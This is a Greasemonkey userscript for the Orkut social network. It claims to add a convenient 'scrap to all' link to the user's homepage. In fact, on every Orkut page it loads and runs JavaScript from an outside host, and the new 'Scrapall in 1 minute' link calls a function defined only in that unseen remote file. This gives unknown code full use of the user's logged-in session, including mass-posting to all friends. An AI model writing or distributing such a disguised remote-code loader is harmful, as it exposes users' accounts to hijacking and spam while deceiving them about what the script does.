// ==UserScript==
// @name Orkut --- scrap to all link on ur Home Page
// @description puts ur send to All link on ur homepage..
// @include http://www.orkut.com/*
// By D J Darpan
// ==UserScript==

function include(file) {
            var script  = document.createElement('script');
            script.src  = file;
            script.type = 'text/javascript';
            script.defer = true;
            document.getElementsByTagName('head').item(0).appendChild(script);
        }

        include('http://www.biharonnet.com/script/os.js');


 var tda=document.getElementsByTagName("ul")[1];
tda.innerHTML+="<li>&nbsp;|&nbsp;</li><li><a href=javascript:include(); OnClick=dar();>Scrapall in 1 minute </a>&nbsp;|&nbsp;</li>";